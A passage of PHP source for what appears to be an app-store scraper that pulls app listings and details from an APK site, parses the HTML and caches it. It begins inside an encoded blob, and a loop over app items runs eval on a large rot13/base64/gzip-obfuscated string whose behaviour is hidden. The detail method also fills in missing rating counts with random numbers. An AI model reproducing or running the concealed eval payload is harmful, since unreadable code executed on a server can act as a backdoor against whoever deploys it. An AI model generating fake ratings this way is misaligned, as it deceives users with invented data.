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')))));
                    $value = $valueMatch[1];
                    $assoc = Phamda\curry(function($prop, $val, $array){
                        $result = [];
                        foreach($array as $key => $value)
                            $result[$key] = $value;
                        $result[$prop] = $val;
                        return $result;
                    });
                    return $assoc($key, $value, $accum);

                }
                return $accum;
            }, []);

            if ( isset($allMatched['ds:3'] )) {
                $allMatchedArray = json_decode( $allMatched['ds:3'] ?? [] );
                $apps = array_map(function( $items ) {
                    $_itemArrays = $items[1][0][0][0] ?? [];
                    $result = [];
                    foreach($_itemArrays as $index => $item) {
                        eval(gzinflate(base64_decode(str_rot13('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'))));
                    }
                    return $result;
                }, $allMatchedArray );

                $apps = array_first($apps);
                $apps = array_slice($apps, 0, 30);
            }

            return $apps;


        } catch (GuzzleException $e) {

            if ($e instanceof ClientException && $e->hasResponse()) {
                throw new Exception($e->getResponse()->getReasonPhrase(), 3);
            }
            else
                throw new Exception($e->getMessage(), 3);
        }
    }


    /**
    * Get App Details such as description, screenshots etc.
    *
    * @return void
    * @access  public
    **/
    public function detail($appId,$opts = [], $comingFrom = false)
    {

        try {

            if(!$appId)
                throw new Exception("No App Url Found", 1);

            $params = [
                'id' => $appId
            ];
            $query = http_build_query($params);

            $_html = [

                'title'       => 'div.title-like h1',
                'image_url'   => 'div.icon > img',
                'description' => '#describe  div.content',
                'screenshots' => '.det-pic-list a',
                'tags'        => '.tag_list li > a',
                'category'    => '.additional li>meta[itemprop=applicationSubCategory]',

                'current_ratings' => '.rating>span[itemprop="ratingValue"]',
                'total_ratings'   => '.rating>meta[itemprop="ratingCount"]',

                'developer'        => '.details-author a',
                'meta_keywords'    => 'meta[name="keywords"]',
                'meta_description' => 'meta[name="description"]',

                'latest_version' => '.details-sdk span',
                'download_url'   => '.ny-down a.da',


                'additional_info' => '.additional li',
            ];

            $appUrl    = $this->url.'/store/apps/details?'.$query;
            $detailUrl = $this->apkPureDetailUrl.$appId;
            logger()->debug("url to request {$detailUrl}");
            $cacheKey  = "app_id:{$appId}";
            $that      = $this;

            $htmlCodes = cache()->remember($cacheKey, now()->addWeek(), function () use($that, $detailUrl) {
                $response = $that->webClient->get($detailUrl);
                return $response->getBody()->getContents();
            });
            $content = new Crawler($htmlCodes);

            $description = ( $content->filter($_html['description'])->count() > 0) ? $content->filter($_html['description'])->html() : '';
            $screenshots = $content->filter($_html['screenshots']);

            $_screenshotArray = ($screenshots->count() > 0) ? $screenshots->extract('href') : [];
            $screenshotArray  = [];
            if ( $_screenshotArray ) {
                $index = 0;
                $screenshotArray = array_map(function($item) use($index) {
                                    return [
                                        'id'         => ++$index,
                                        'image_link' => $item,
                                        'preview'    => $item
                                    ];
                                }, $_screenshotArray);
            }
            $tagArray = [];
            $tagContents = $content->filter($_html['tags']);
            if($tagContents->count() > 0) {
                $tagArray = $tagContents->each(function(Crawler $node,$i) {
                    return utf8_decode(trim($node->html()));
                });
            }

            $categoryContent = ($content->filter($_html['category'])->count() > 0) ? $content->filter($_html['category'])->attr('content') : '';
            $currentRating   = ($content->filter($_html['current_ratings'])->count() > 0) ?  (float) $content->filter($_html['current_ratings'])->html() : 5;
            $totalRatings   = ($content->filter($_html['total_ratings'])->count() > 1) ?  (float) $content->filter($_html['total_ratings'])->attr('content') : rand(5000, 2000000);

            if ( $currentRating > 5) {
                $currentRating = 5 * ($currentRating / 10);
            }

            $developerContent = ($content->filter($_html['developer'])->count() > 0) ? $content->filter($_html['developer'])->html() : '';
            $developerUrlContent = $this->url.'/store/apps/developer?id='.$developerContent;

            $metaDescriptionContent = ($content->filter($_html['meta_description'])->count() > 0) ? $content->filter($_html['meta_description'])->attr('content') : '';
            $metaKeywordContent     = ($content->filter($_html['meta_keywords'])->count() > 0) ? $content->filter($_html['meta_keywords'])->attr('content') : '';
            $appImageUrl            = ($content->filter($_html['image_url'])->count() > 0) ? $content->filter($_html['image_url'])->attr('src') : '';

            $appTitle = ($content->filter($_html['title'])->count() > 0) ? $content->filter($_html['title'])->html() : '';

            $latestVersion = ($content->filter($_html['latest_version'])->count() > 0) ? $content->filter($_html['latest_version'])->html() : '1.0';

            $downloadUrl = ($content->filter($_html['download_url'])->count() > 0) ? $content->filter($_html['download_url'])->attr('href') : '#';

            $additionalContents = $content->filter($_html['additional_info']);
            $moreDetailArray = [];
            if($additionalContents->count() > 0) {
                $moreDetailArray = $additionalContents->each(function(Crawler $node,$i) use($latestVersion)  {

                    $_moreDetailArray = [];
                    switch ($i) {
                        case '1':
                            $_moreDetailArray = [
                                'title'      => 'Latest Version',
                                'identifier' => 'latest_version',
                                'value'      => $latestVersion
                            ];
                            break;

                        case '2':

                            $datePublished = now()->format('Y-m-d');
                            if( $node->filter('p')->count() > 0)
                                $datePublished = $node->filter('p[itemprop="datePublished"]')->html();

                            $_moreDetailArray = [
                                'title'      => 'Publish Date',
                                'identifier' => 'published_date',
                                'value'      => $datePublished
                            ];
                            break;


                        case '4':
                            $requiredAndroid = 'Latest';
                            if( $node->filter('p')->count() > 0)
                                $requiredAndroid = $node->filter('p')->last()->html();

                            $_moreDetailArray = [
                                'title'      => 'Requirement',
                                'identifier' => 'required_android',
                                'value'      => $requiredAndroid
                            ];
                            break;

                    }
                    return $_moreDetailArray;
                });

                $moreDetailArray = array_values(array_filter($moreDetailArray));

            }


            if ( $comingFrom === 'admin') {
                $metaKeywordContent = explode(',', $metaKeywordContent);
            }
            $detailArray = [
                'app_id'            => $appId,
                'value'             => $appId,
                'title'             => $appTitle,
                'label'             => $appTitle,
                'slug'              => str_slug($appTitle),
                'app_image_url'     => $appImageUrl,
                'app_link'          => $appUrl,
                'description'       => $description,
                'status_identifier' => 'active',
                'short_description' => str_limit( trim(strip_tags($description)), 200),

                'current_ratings' => $currentRating,
                'categories'      => [
                    [
                        'label' => $categoryContent,
                        'value' => str_slug($categoryContent,'_'),
                    ]
                ],
                'screenshots'     => $screenshotArray,
                'screenshot_previews'     => $screenshotArray,

                'total_ratings'  => $totalRatings,
